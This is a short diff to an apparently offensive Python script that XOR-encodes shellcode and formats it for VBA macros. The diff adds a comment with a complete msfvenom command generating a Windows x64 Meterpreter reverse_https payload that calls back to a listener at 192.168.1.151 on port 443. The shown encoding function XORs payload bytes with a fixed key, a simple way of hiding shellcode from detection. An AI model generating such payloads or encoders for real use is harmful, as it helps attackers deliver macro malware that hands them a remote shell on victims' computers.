@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
 # XOR-encode shellcode and format it for VBA macros
+# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.151 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
 
 def xor_encode_shellcode(shellcode_bytes, key=0xFA):
     return bytearray([b ^ key for b in shellcode_bytes])
